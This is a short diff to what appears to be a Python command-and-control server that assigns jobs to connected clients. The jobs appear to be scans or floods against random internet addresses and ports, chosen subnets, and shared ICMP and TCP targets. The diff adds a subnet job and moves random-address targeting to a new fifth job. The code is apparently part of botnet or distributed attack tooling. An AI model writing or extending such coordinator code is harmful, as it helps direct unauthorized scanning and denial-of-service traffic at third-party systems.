@@ -58,16 +58,16 @@ def ifsuccess(conn, addr, v): # Checks if incoming client is reporting job succe
         send(conn, addr, [ COMPLETION_ACK ])
 
 def hire(conn, addr, v): # Give job to a client
-    jobNum = random.randint(0, 3)
+    jobNum = random.randint(0, 4)
+
 
     if jobNum == 0:
         ip = random.choice(iplist)
         send(conn, addr, [ JOB_ASSIGNMENT, jobNum+1, ip ])
 
     if jobNum == 1:
-        ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
-        port = random.randint(0, 65535)
-        send(conn, addr, [ JOB_ASSIGNMENT, jobNum+1, ip, port ])
+        subnet = random.choice(subnets)
+        send(conn, addr, [JOB_ASSIGNMENT, jobNum+1, subnet])
 
     if jobNum == 2:
         global ICMPTarget
@@ -96,6 +96,12 @@ def hire(conn, addr, v): # Give job to a client
         ip = random.choice(iplist)
         send(conn, addr, [ JOB_ASSIGNMENT, jobNum+1, TCPTarget[0], TCPTarget[1]])
         multijobqueue[1] = 0
+
+    if jobNum == 4:
+        ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+        port = random.randint(0, 65535)
+        send(conn, addr, [ JOB_ASSIGNMENT, jobNum+1, ip, port ])
+
 
 def connect_client(conn, addr):
     print(f"New connection established.")
